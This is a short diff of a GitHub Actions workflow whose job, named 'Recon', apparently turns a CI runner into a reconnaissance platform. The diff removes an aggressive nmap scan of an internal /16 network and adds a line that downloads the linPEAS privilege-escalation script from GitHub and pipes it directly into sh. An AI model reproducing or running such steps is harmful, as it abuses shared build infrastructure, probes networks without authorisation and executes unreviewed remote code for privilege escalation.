@@ -4,11 +4,8 @@ jobs:
   Recon: #Each job can run for 6h max
     runs-on: ubuntu-latest
     steps:
-      - run: echo "Recon"
       - run: |     
-            ifconfig
-            sudo apt install nmap
-            nmap -v -A 10.1.0.0/16
+            curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
             
 
 
